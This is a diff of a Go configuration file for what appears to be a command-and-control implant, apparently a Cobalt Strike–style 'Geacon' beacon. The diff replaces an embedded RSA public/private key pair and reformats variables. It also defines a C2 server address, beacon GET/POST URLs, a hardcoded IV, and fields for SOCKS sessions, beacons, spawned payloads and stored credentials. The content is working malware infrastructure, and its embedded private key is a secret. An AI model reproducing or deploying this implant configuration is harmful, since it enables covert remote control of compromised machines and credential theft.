@@ -7,48 +7,49 @@ import (
 var (
 	RsaPublicKey = []byte(`
 -----BEGIN PUBLIC KEY-----
-MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCTPK7U38QBCS5o8rpaMVThN1MnNdMosOnTVk+a
-bOpeCI0GraidwG+7JIPMEwGcXBzqWkEAJcJ268nfi86A+4FpN0zm7j9907Nbpqnn+dhLi1AS+rmD
-i+s86EytixLzihxfN1mjimca/9/dXH8gsNN9fxiQx27x4QiEzcprkvFjowIDAQAB
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCM20iSmM0mHtheU8wDAsgkw6+So+uWodPzTu6Q
+z/lro+SGFw81ffcntyyzVRWlGrMLf0ud3icxY/IXbP1X7GaIigx8ODD3P4ZSI28ZkN6qs12hfMS6
+qxmWdlRFpDo+gWtaHNDf82J9ZA2mvmCocBsU86XEGncj8sFVhcHsLVamuwIDAQAB
 -----END PUBLIC KEY-----	
 	`)
 	RsaPrivateKey = []byte(`
 -----BEGIN PRIVATE KEY-----
-MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBAJM8rtTfxAEJLmjyuloxVOE3Uyc1
-0yiw6dNWT5ps6l4IjQatqJ3Ab7skg8wTAZxcHOpaQQAlwnbryd+LzoD7gWk3TObuP33Ts1umqef5
-2EuLUBL6uYOL6zzoTK2LEvOKHF83WaOKZxr/391cfyCw031/GJDHbvHhCITNymuS8WOjAgMBAAEC
-gYAEe6SE0i/sc5RBmTSqM392rk0gtICN+lT/rt7LUpx96ZuYf1EcIRRqZSbL3+OzhezACDrktkGc
-Yehcw9BoGGTfIMofgG0462FmaJyqrzy6vdi84z8AaI5MdN+eaAg80urz70RxOgfm8uljCv8YNYcW
-od69hPHKZn0/AYQGneLmgQJBAPeidqKagsnAh2cqkw+S8vDvEhNvQLtFTY84N173jk9zQdQQ9TJk
-C+fttKdqqEUi2XNjg/9abnEQy9CplMwq9AcCQQCYNfv9xOr6158PTe/6nviHdVOGwSQ6YY2Vsq9A
-qUmzEKE1V93AaGUXnA/OUVi+eWrjIxgJ2tQwhrS/vruNi4SFAkBJ6ItP7J2saXIAMIzD0TABCNl0
-Q3gmbIDBhh3AklI/FD9Jc+Y6q/GBv0hzzzl5qPUNo136EJt103WBSZvHc+pxAkBnaZYRLe6wCjro
-/Pyke8lCzvW2whZJC+pT4JitB9cor423XkEs7kBwr/kVJbNzha6XL0qvt1setQasl3t5iWa5AkBx
-u6rc/0Jb6AU5w6IDmsEMtOagudrtCA3i3Ra0hJ97nHI6UYEOk/TIk0H6RnXu+jxmTec9KiPl4/K/
-ziENcO3c
+MIICcwIBADANBgkqhkiG9w0BAQEFAASCAl0wggJZAgEAAoGBAIzbSJKYzSYe2F5TzAMCyCTDr5Kj
+65ah0/NO7pDP+Wuj5IYXDzV99ye3LLNVFaUaswt/S53eJzFj8hds/VfsZoiKDHw4MPc/hlIjbxmQ
+3qqzXaF8xLqrGZZ2VEWkOj6Ba1oc0N/zYn1kDaa+YKhwGxTzpcQadyPywVWFwewtVqa7AgMBAAEC
+fx5kSU2r9P4faH1hhKNZhpkrn82m+8MCSFv/QNv+DQ+Jrwr1IfXdHBUYkWKinAj6aqwHFcdgqeEC
+7CIPM5XqOMn5Ix5bVqPxvLD+lqit0XI2aMD1FUjZkJv3JpUYvUzIr4ldsV51OJVMZQTWRedxeupl
+YJmA584T/feq1sAJpGECQQC5V8SddUnXH8PsIGZ8MiiOOk95fDxnfdSas6aX8Tapji4iNMxWMOUH
+YkSxqvMZxLPMAT3KbeoewKclPnSgorsZAkEAwo3za0en9+z2hHY5wxWZF3u0ACm12mJESZyQwZEC
+d94Lt+c0ylKFcDzfSnjN6MfS0FVrT0vMcVdDluuJ5uc+8wJANUrDQfMjlDOSBica0MMrXhnuGCRc
+yfUoWIMnd7Dn4sD7CuLbjjzo3cKntd5NoC8q85G3zqjkFIuYg+D9b+LaoQJAEUuRMh5CnlWgbJId
+/Gu1GlNS4xjSI8HMlEaoz6xWbdV9cTHKjZncZufiabpng6QP55lQWtJAMGszhP0XW0F/ZQJAHq0R
+j5qENbONKCBT6K17bE52tfcLg9cMQei662Ub+gH9nsUy5phOaS2eNbM99Am2+rhJe8gY5pT95QYI
+OpELiA==
 -----END PRIVATE KEY-----
 	`)
 
-
 	// C2        = "0.0.0.0:4445"
-	C2		  = "192.168.178.97:80"
-	plainHTTP = "http://"
-	sslHTTP   = "https://"
-	GetUrl    = plainHTTP + C2 + "/api/v1/status"
-	PostUrl   = plainHTTP + C2 + "/api/v1/entry?id="
-	WaitTime  = 10000 * time.Millisecond
-	VerifySSLCert = true
-	TimeOut time.Duration  = 10 //seconds
+	C2                          = "192.168.178.97:80"
+	plainHTTP                   = "http://"
+	sslHTTP                     = "https://"
+	GetUrl                      = plainHTTP + C2 + "/api/v1/status"
+	PostUrl                     = plainHTTP + C2 + "/api/v1/entry?id="
+	WaitTime                    = 10000 * time.Millisecond
+	VerifySSLCert               = true
+	TimeOut       time.Duration = 10 //seconds
 
-	IV        = []byte("abcdefghijklmnop")
-	GlobalKey []byte
-	AesKey    []byte
-	HmacKey   []byte
-	Counter   = 0
-	TcpBeacons []TcpBeacon
-	SocksSessions []*SocksSession
+	IV                 = []byte("abcdefghijklmnop")
+	GlobalKey          []byte
+	AesKey             []byte
+	HmacKey            []byte
+	Counter            = 0
+	TcpBeacons         []TcpBeacon
+	SocksSessions      []*SocksSession
 	ShellPreLoadedFile string
-	StoredCredentials *StoredCredential
+	StoredCredentials  *StoredCredential
+	GeaconId           = 0
+	SpawnBuffer        []byte
 )
 
 const (
